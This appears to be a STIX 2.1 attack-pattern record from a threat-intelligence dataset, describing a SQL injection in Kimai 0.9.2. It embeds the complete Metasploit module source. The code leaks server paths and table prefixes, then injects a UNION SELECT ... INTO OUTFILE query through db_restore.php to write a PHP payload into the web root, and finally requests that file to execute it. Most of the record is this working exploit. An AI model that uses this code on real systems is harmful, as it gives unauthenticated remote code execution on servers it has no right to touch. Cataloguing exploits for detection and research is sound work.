{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--03ddb452-d78a-454f-b5ca-aff8dedf20d1",
    "created": "2024-08-14T17:12:19.662326Z",
    "modified": "2024-08-14T17:12:19.662331Z",
    "name": "\"Kimai v0.9.2 db_restore.php SQL Injection\"",
    "description": " This module exploits a SQL injection vulnerability in Kimai version 0.9.2.x. The 'db_restore.php' file allows unauthenticated users to execute arbitrary SQL queries. This module writes a PHP payload to disk if the following conditions are met: The PHP configuration must have 'display_errors' enabled, Kimai must be configured to use a MySQL database running on localhost; and the MySQL user must have write permission to the Kimai 'temporary' directory.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/kimai_sqli.rb",
            "external_id": "kimai_sqli.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Kimai v0.9.2 'db_restore.php' SQL Injection\",\n      'Description'    => %q{\n          This module exploits a SQL injection vulnerability in Kimai version\n        0.9.2.x. The 'db_restore.php' file allows unauthenticated users to\n        execute arbitrary SQL queries. This module writes a PHP payload to\n        disk if the following conditions are met: The PHP configuration must\n        have 'display_errors' enabled, Kimai must be configured to use a\n        MySQL database running on localhost; and the MySQL user must have\n        write permission to the Kimai 'temporary' directory.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'drone', # Discovery and PoC\n          'bcoles' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['EDB',       '25606'],\n          ['OSVDB',     '93547'],\n        ],\n      'Payload'        =>\n        {\n          'Space'      => 8000, # HTTP POST\n          'DisableNops'=> true,\n          'BadChars'   => \"\\x00\\x0a\\x0d\\x27\"\n        },\n      'Arch'           => ARCH_PHP,\n      'Platform'       => 'php',\n      'Targets'        =>\n        [\n          # Tested on Kimai versions 0.9.2.beta, 0.9.2.1294.beta, 0.9.2.1306-3\n          [ 'Kimai version 0.9.2.x (PHP Payload)', { 'auto' => true } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-05-21',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI',  [true,  'The base path to Kimai', '/kimai/']),\n          OptString.new('FALLBACK_TARGET_PATH', [false, 'The path to the web server document root directory', '/var/www/']),\n          OptString.new('FALLBACK_TABLE_PREFIX', [false, 'The MySQL table name prefix string for Kimai tables', 'kimai_'])\n        ])\n  end\n\n  #\n  # Checks if target is Kimai version 0.9.2.x\n  #\n  def check\n    vprint_status(\"Checking version...\")\n    res = send_request_raw({ 'uri' => normalize_uri(target_uri.path, \"index.php\") })\n    if not res\n      vprint_error(\"Request timed out\")\n      return Exploit::CheckCode::Unknown\n    elsif res.body =~ /Kimai/ and res.body =~ /(0\\.9\\.[\\d\\.]+)<\\/strong>/\n      version = \"#{$1}\"\n      print_good(\"Found version: #{version}\")\n      if version >= \"0.9.2\" and version <= \"0.9.2.1306\"\n        return Exploit::CheckCode::Appears\n      end\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    # Get file system path\n    print_status(\"Retrieving file system path...\")\n    res = send_request_raw({ 'uri' => normalize_uri(target_uri.path, 'includes/vars.php') })\n    if not res\n      fail_with(Failure::Unknown, \"#{peer} - Request timed out\")\n    elsif res.body =~ /Undefined variable: .+ in (.+)includes\\/vars\\.php on line \\d+/\n      path = \"#{$1}\"\n      print_good(\"Found file system path: #{path}\")\n    else\n      path = normalize_uri(datastore['FALLBACK_TARGET_PATH'], target_uri.path)\n      print_warning(\"Could not retrieve file system path. Assuming '#{path}'\")\n    end\n\n    # Get MySQL table name prefix from temporary/logfile.txt\n    print_status(\"Retrieving MySQL table name prefix...\")\n    res = send_request_raw({ 'uri' => normalize_uri(target_uri.path, 'temporary', 'logfile.txt') })\n    if not res\n      fail_with(Failure::Unknown, \"#{peer} - Request timed out\")\n    elsif prefixes = res.body.scan(/CREATE TABLE `(.+)usr`/)\n      table_prefix = \"#{prefixes.flatten.last}\"\n      print_good(\"Found table name prefix: #{table_prefix}\")\n    else\n      table_prefix = normalize_uri(datastore['FALLBACK_TABLE_PREFIX'], target_uri.path)\n      print_warning(\"Could not retrieve MySQL table name prefix. Assuming '#{table_prefix}'\")\n    end\n\n    # Create a backup ID\n    print_status(\"Creating a backup to get a valid backup ID...\")\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'db_restore.php'),\n      'vars_post' => {\n        'submit'  => 'create backup'\n      }\n    })\n    if not res\n      fail_with(Failure::Unknown, \"#{peer} - Request timed out\")\n    elsif backup_ids = res.body.scan(/name=\"dates\\[\\]\" value=\"(\\d+)\">/)\n      id = \"#{backup_ids.flatten.last}\"\n      print_good(\"Found backup ID: #{id}\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Could not retrieve backup ID\")\n    end\n\n    # Write PHP payload to disk using MySQL injection 'into outfile'\n    fname = \"#{rand_text_alphanumeric(rand(10)+10)}.php\"\n    sqli  = \"#{id}_#{table_prefix}var UNION SELECT '<?php #{payload.encoded} ?>' INTO OUTFILE '#{path}/temporary/#{fname}';-- \"\n    print_status(\"Writing payload (#{payload.encoded.length} bytes) to '#{path}/temporary/#{fname}'...\")\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'db_restore.php'),\n      'vars_post' => Hash[{\n        'submit'  => 'recover',\n        'dates[]' => sqli\n      }.to_a.shuffle]\n    })\n    if not res\n      fail_with(Failure::Unknown, \"#{peer} - Request timed out\")\n    elsif res.code == 200\n      print_good(\"Payload sent successfully\")\n      register_files_for_cleanup(fname)\n    else\n      print_error(\"Sending payload failed. Received HTTP code: #{res.code}\")\n    end\n\n    # Remove the backup\n    print_status(\"Removing the backup...\")\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'db_restore.php'),\n      'vars_post' => Hash[{\n        'submit'  => 'delete',\n        'dates[]' => \"#{id}\"\n      }.to_a.shuffle]\n    })\n    if not res\n      print_warning(\"Request timed out\")\n    elsif res.code == 302 and res.body !~ /#{id}/\n      vprint_good(\"Deleted backup with ID '#{id}'\")\n    else\n      print_warning(\"Could not remove backup with ID '#{id}'\")\n    end\n\n    # Execute payload\n    print_status(\"Retrieving file '#{fname}'...\")\n    res = send_request_raw({\n      'uri' => normalize_uri(target_uri.path, 'temporary', \"#{fname}\")\n    }, 5)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-21",
    "x_mitre_platforms": [
        "php'"
    ]
}